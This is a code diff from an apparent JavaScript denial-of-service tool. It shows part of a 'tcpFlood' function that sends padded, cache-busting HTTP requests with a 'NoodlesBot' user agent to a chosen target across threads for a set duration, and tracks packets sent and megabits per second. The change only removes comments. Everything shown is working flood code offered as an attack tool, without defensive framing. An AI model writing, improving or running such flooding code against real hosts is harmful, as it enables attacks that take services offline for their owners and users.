@@ -79,18 +79,17 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
               "Host: " + target + "\r\n" +
               "Connection: keep-alive\r\n" +
               "User-Agent: NoodlesBot\r\n" +
-              "Cache-Control: no-cache\r\n" + // Add no-cache header
-              "Accept-Encoding: gzip, deflate, br\r\n" + // Request compressed content
+              "Cache-Control: no-cache\r\n" +
+              "Accept-Encoding: gzip, deflate, br\r\n" +
               "X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n" +
               "\r\n";
 
-            // Increase payload size with random data
-            const randomData = Math.random().toString(36).repeat(500); // Adjust repeat value as needed
+            const randomData = Math.random().toString(36).repeat(500);
             payload += randomData;
 
             socket.write(payload);
             packetsSent++;
-            bytesSent += payload.length; // Track total bytes sent
+            bytesSent += payload.length;
 
             const elapsedTime = (Date.now() - startTime) / 1000;
             const mbps = (bytesSent / 1000000) / elapsedTime;
@@ -99,7 +98,7 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
               statusCallback({
                 status: 'packet_sent',
                 packets: packetsSent,
-                mbps: mbps.toFixed(2) // MBPS with 2 decimal places
+                mbps: mbps.toFixed(2)
               });
             }
 
